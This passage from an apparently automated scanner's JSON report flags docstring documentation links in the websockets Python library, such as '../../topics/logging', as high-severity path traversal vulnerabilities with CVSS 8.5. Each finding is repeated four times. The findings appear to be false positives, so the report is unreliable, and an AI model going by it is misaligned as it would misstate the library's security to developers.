            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/server.py",
            "line": 659,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.server\")``. See the\n            :doc:`logging guide <../../topics/logging>` for details.\n        create_connection: Factory for the :class:`ServerConnection` managing\n            the connection. Set it to a wrapper or a subclass to customize",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/server.py",
            "line": 659,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.server\")``. See the\n            :doc:`logging guide <../../topics/logging>` for details.\n        create_connection: Factory for the :class:`ServerConnection` managing\n            the connection. Set it to a wrapper or a subclass to customize",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/server.py",
            "line": 659,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.server\")``. See the\n            :doc:`logging guide <../../topics/logging>` for details.\n        create_connection: Factory for the :class:`ServerConnection` managing\n            the connection. Set it to a wrapper or a subclass to customize",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/server.py",
            "line": 659,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.server\")``. See the\n            :doc:`logging guide <../../topics/logging>` for details.\n        create_connection: Factory for the :class:`ServerConnection` managing\n            the connection. Set it to a wrapper or a subclass to customize",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/client.py",
            "line": 217,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`compression guide <../../topics/compression>` for details.",
            "context": "        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the\n            :doc:`compression guide <../../topics/compression>` for details.\n        additional_headers (HeadersLike | None): Arbitrary HTTP headers to add\n            to the handshake request.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/client.py",
            "line": 217,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`compression guide <../../topics/compression>` for details.",
            "context": "        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the\n            :doc:`compression guide <../../topics/compression>` for details.\n        additional_headers (HeadersLike | None): Arbitrary HTTP headers to add\n            to the handshake request.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/client.py",
            "line": 217,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`compression guide <../../topics/compression>` for details.",
            "context": "        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the\n            :doc:`compression guide <../../topics/compression>` for details.\n        additional_headers (HeadersLike | None): Arbitrary HTTP headers to add\n            to the handshake request.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/client.py",
            "line": 217,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`compression guide <../../topics/compression>` for details.",
            "context": "        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the\n            :doc:`compression guide <../../topics/compression>` for details.\n        additional_headers (HeadersLike | None): Arbitrary HTTP headers to add\n            to the handshake request.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/client.py",
            "line": 226,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "<../../topics/proxies>` for details.",
            "context": "            to :obj:`None` to disable the proxy or to the address of a proxy\n            to override the system configuration. See the :doc:`proxy docs\n            <../../topics/proxies>` for details.\n        process_exception: When reconnecting automatically, tell whether an\n            error is transient or fatal. The default behavior is defined by",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/client.py",
            "line": 226,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "<../../topics/proxies>` for details.",
            "context": "            to :obj:`None` to disable the proxy or to the address of a proxy\n            to override the system configuration. See the :doc:`proxy docs\n            <../../topics/proxies>` for details.\n        process_exception: When reconnecting automatically, tell whether an\n            error is transient or fatal. The default behavior is defined by",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/client.py",
            "line": 226,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "<../../topics/proxies>` for details.",
            "context": "            to :obj:`None` to disable the proxy or to the address of a proxy\n            to override the system configuration. See the :doc:`proxy docs\n            <../../topics/proxies>` for details.\n        process_exception: When reconnecting automatically, tell whether an\n            error is transient or fatal. The default behavior is defined by",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/client.py",
            "line": 226,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "<../../topics/proxies>` for details.",
            "context": "            to :obj:`None` to disable the proxy or to the address of a proxy\n            to override the system configuration. See the :doc:`proxy docs\n            <../../topics/proxies>` for details.\n        process_exception: When reconnecting automatically, tell whether an\n            error is transient or fatal. The default behavior is defined by",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/client.py",
            "line": 251,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this client.\n            It defaults to ``logging.getLogger(\"websockets.client\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n        create_connection: Factory for the :class:`ClientConnection` managing\n            the connection. Set it to a wrapper or a subclass to customize",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/client.py",
            "line": 251,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this client.\n            It defaults to ``logging.getLogger(\"websockets.client\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n        create_connection: Factory for the :class:`ClientConnection` managing\n            the connection. Set it to a wrapper or a subclass to customize",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/client.py",
            "line": 251,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this client.\n            It defaults to ``logging.getLogger(\"websockets.client\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n        create_connection: Factory for the :class:`ClientConnection` managing\n            the connection. Set it to a wrapper or a subclass to customize",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/client.py",
            "line": 251,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this client.\n            It defaults to ``logging.getLogger(\"websockets.client\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n        create_connection: Factory for the :class:`ClientConnection` managing\n            the connection. Set it to a wrapper or a subclass to customize",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/server.py",
            "line": 232,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.server\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/server.py",
            "line": 232,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.server\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/server.py",
            "line": 232,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.server\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/server.py",
            "line": 232,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.server\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/server.py",
            "line": 431,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`compression guide <../../topics/compression>` for details.",
            "context": "        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the\n            :doc:`compression guide <../../topics/compression>` for details.\n        process_request: Intercept the request during the opening handshake.\n            Return an HTTP response to force the response. Return :obj:`None` to",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/server.py",
            "line": 431,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`compression guide <../../topics/compression>` for details.",
            "context": "        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the\n            :doc:`compression guide <../../topics/compression>` for details.\n        process_request: Intercept the request during the opening handshake.\n            Return an HTTP response to force the response. Return :obj:`None` to",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/server.py",
            "line": 431,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`compression guide <../../topics/compression>` for details.",
            "context": "        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the\n            :doc:`compression guide <../../topics/compression>` for details.\n        process_request: Intercept the request during the opening handshake.\n            Return an HTTP response to force the response. Return :obj:`None` to",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/server.py",
            "line": 431,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`compression guide <../../topics/compression>` for details.",
            "context": "        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the\n            :doc:`compression guide <../../topics/compression>` for details.\n        process_request: Intercept the request during the opening handshake.\n            Return an HTTP response to force the response. Return :obj:`None` to",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/server.py",
            "line": 461,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.server\")``. See the\n            :doc:`logging guide <../../topics/logging>` for details.\n        create_connection: Factory for the :class:`ServerConnection` managing\n            the connection. Set it to a wrapper or a subclass to customize",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/server.py",
            "line": 461,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.server\")``. See the\n            :doc:`logging guide <../../topics/logging>` for details.\n        create_connection: Factory for the :class:`ServerConnection` managing\n            the connection. Set it to a wrapper or a subclass to customize",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/server.py",
            "line": 461,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.server\")``. See the\n            :doc:`logging guide <../../topics/logging>` for details.\n        create_connection: Factory for the :class:`ServerConnection` managing\n            the connection. Set it to a wrapper or a subclass to customize",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/server.py",
            "line": 461,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.server\")``. See the\n            :doc:`logging guide <../../topics/logging>` for details.\n        create_connection: Factory for the :class:`ServerConnection` managing\n            the connection. Set it to a wrapper or a subclass to customize",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/client.py",
            "line": 191,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`compression guide <../../topics/compression>` for details.",
            "context": "        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the\n            :doc:`compression guide <../../topics/compression>` for details.\n        additional_headers (HeadersLike | None): Arbitrary HTTP headers to add\n            to the handshake request.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/client.py",
            "line": 191,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`compression guide <../../topics/compression>` for details.",
            "context": "        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the\n            :doc:`compression guide <../../topics/compression>` for details.\n        additional_headers (HeadersLike | None): Arbitrary HTTP headers to add\n            to the handshake request.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/client.py",
            "line": 191,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`compression guide <../../topics/compression>` for details.",
            "context": "        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the\n            :doc:`compression guide <../../topics/compression>` for details.\n        additional_headers (HeadersLike | None): Arbitrary HTTP headers to add\n            to the handshake request.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/client.py",
            "line": 191,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`compression guide <../../topics/compression>` for details.",
            "context": "        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the\n            :doc:`compression guide <../../topics/compression>` for details.\n        additional_headers (HeadersLike | None): Arbitrary HTTP headers to add\n            to the handshake request.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/client.py",
            "line": 200,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "<../../topics/proxies>` for details.",
            "context": "            to :obj:`None` to disable the proxy or to the address of a proxy\n            to override the system configuration. See the :doc:`proxy docs\n            <../../topics/proxies>` for details.\n        proxy_ssl: Configuration for enabling TLS on the proxy connection.\n        proxy_server_hostname: Host name for the TLS handshake with the proxy.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/client.py",
            "line": 200,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "<../../topics/proxies>` for details.",
            "context": "            to :obj:`None` to disable the proxy or to the address of a proxy\n            to override the system configuration. See the :doc:`proxy docs\n            <../../topics/proxies>` for details.\n        proxy_ssl: Configuration for enabling TLS on the proxy connection.\n        proxy_server_hostname: Host name for the TLS handshake with the proxy.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/client.py",
            "line": 200,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "<../../topics/proxies>` for details.",
            "context": "            to :obj:`None` to disable the proxy or to the address of a proxy\n            to override the system configuration. See the :doc:`proxy docs\n            <../../topics/proxies>` for details.\n        proxy_ssl: Configuration for enabling TLS on the proxy connection.\n        proxy_server_hostname: Host name for the TLS handshake with the proxy.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/client.py",
            "line": 200,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "<../../topics/proxies>` for details.",
            "context": "            to :obj:`None` to disable the proxy or to the address of a proxy\n            to override the system configuration. See the :doc:`proxy docs\n            <../../topics/proxies>` for details.\n        proxy_ssl: Configuration for enabling TLS on the proxy connection.\n        proxy_server_hostname: Host name for the TLS handshake with the proxy.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/client.py",
            "line": 221,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this client.\n            It defaults to ``logging.getLogger(\"websockets.client\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n        create_connection: Factory for the :class:`ClientConnection` managing\n            the connection. Set it to a wrapper or a subclass to customize",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/client.py",
            "line": 221,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this client.\n            It defaults to ``logging.getLogger(\"websockets.client\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n        create_connection: Factory for the :class:`ClientConnection` managing\n            the connection. Set it to a wrapper or a subclass to customize",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/client.py",
            "line": 221,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this client.\n            It defaults to ``logging.getLogger(\"websockets.client\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n        create_connection: Factory for the :class:`ClientConnection` managing\n            the connection. Set it to a wrapper or a subclass to customize",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/client.py",
            "line": 221,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this client.\n            It defaults to ``logging.getLogger(\"websockets.client\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n        create_connection: Factory for the :class:`ClientConnection` managing\n            the connection. Set it to a wrapper or a subclass to customize",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/server.py",
            "line": 662,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.server\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/server.py",
            "line": 662,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.server\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/server.py",
            "line": 662,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.server\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/server.py",
            "line": 662,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.server\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/server.py",
            "line": 929,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.server\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/server.py",
            "line": 929,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.server\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/server.py",
            "line": 929,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.server\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/server.py",
            "line": 929,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.server\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/server.py",
            "line": 932,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`compression guide <../../topics/compression>` for details.",
            "context": "        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the\n            :doc:`compression guide <../../topics/compression>` for details.\n        origins: Acceptable values of the ``Origin`` header, for defending\n            against Cross-Site WebSocket Hijacking attacks. Include :obj:`None`",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/server.py",
            "line": 932,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`compression guide <../../topics/compression>` for details.",
            "context": "        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the\n            :doc:`compression guide <../../topics/compression>` for details.\n        origins: Acceptable values of the ``Origin`` header, for defending\n            against Cross-Site WebSocket Hijacking attacks. Include :obj:`None`",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/server.py",
            "line": 932,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`compression guide <../../topics/compression>` for details.",
            "context": "        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the\n            :doc:`compression guide <../../topics/compression>` for details.\n        origins: Acceptable values of the ``Origin`` header, for defending\n            against Cross-Site WebSocket Hijacking attacks. Include :obj:`None`",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/server.py",
            "line": 932,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`compression guide <../../topics/compression>` for details.",
            "context": "        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the\n            :doc:`compression guide <../../topics/compression>` for details.\n        origins: Acceptable values of the ``Origin`` header, for defending\n            against Cross-Site WebSocket Hijacking attacks. Include :obj:`None`",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/protocol.py",
            "line": 82,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the discussion of :doc:`keepalive <../../topics/keepalive>` for details.",
            "context": "    .. _Pong: https://datatracker.ietf.org/doc/html/rfc6455#section-5.5.3\n\n    See the discussion of :doc:`keepalive <../../topics/keepalive>` for details.\n\n    The ``close_timeout`` parameter defines a maximum wait time for completing",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/protocol.py",
            "line": 82,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the discussion of :doc:`keepalive <../../topics/keepalive>` for details.",
            "context": "    .. _Pong: https://datatracker.ietf.org/doc/html/rfc6455#section-5.5.3\n\n    See the discussion of :doc:`keepalive <../../topics/keepalive>` for details.\n\n    The ``close_timeout`` parameter defines a maximum wait time for completing",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/protocol.py",
            "line": 82,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the discussion of :doc:`keepalive <../../topics/keepalive>` for details.",
            "context": "    .. _Pong: https://datatracker.ietf.org/doc/html/rfc6455#section-5.5.3\n\n    See the discussion of :doc:`keepalive <../../topics/keepalive>` for details.\n\n    The ``close_timeout`` parameter defines a maximum wait time for completing",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/protocol.py",
            "line": 82,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the discussion of :doc:`keepalive <../../topics/keepalive>` for details.",
            "context": "    .. _Pong: https://datatracker.ietf.org/doc/html/rfc6455#section-5.5.3\n\n    See the discussion of :doc:`keepalive <../../topics/keepalive>` for details.\n\n    The ``close_timeout`` parameter defines a maximum wait time for completing",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/protocol.py",
            "line": 131,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the discussion of :doc:`memory usage <../../topics/memory>` for details.",
            "context": "    current implementation of ``FlowControlMixin``).\n\n    See the discussion of :doc:`memory usage <../../topics/memory>` for details.\n\n    Args:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/protocol.py",
            "line": 131,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the discussion of :doc:`memory usage <../../topics/memory>` for details.",
            "context": "    current implementation of ``FlowControlMixin``).\n\n    See the discussion of :doc:`memory usage <../../topics/memory>` for details.\n\n    Args:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/protocol.py",
            "line": 131,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the discussion of :doc:`memory usage <../../topics/memory>` for details.",
            "context": "    current implementation of ``FlowControlMixin``).\n\n    See the discussion of :doc:`memory usage <../../topics/memory>` for details.\n\n    Args:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/protocol.py",
            "line": 131,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the discussion of :doc:`memory usage <../../topics/memory>` for details.",
            "context": "    current implementation of ``FlowControlMixin``).\n\n    See the discussion of :doc:`memory usage <../../topics/memory>` for details.\n\n    Args:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/protocol.py",
            "line": 136,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.protocol\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n        ping_interval: Interval between keepalive pings in seconds.\n            :obj:`None` disables keepalive.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/protocol.py",
            "line": 136,
            "severity": "HIGH",
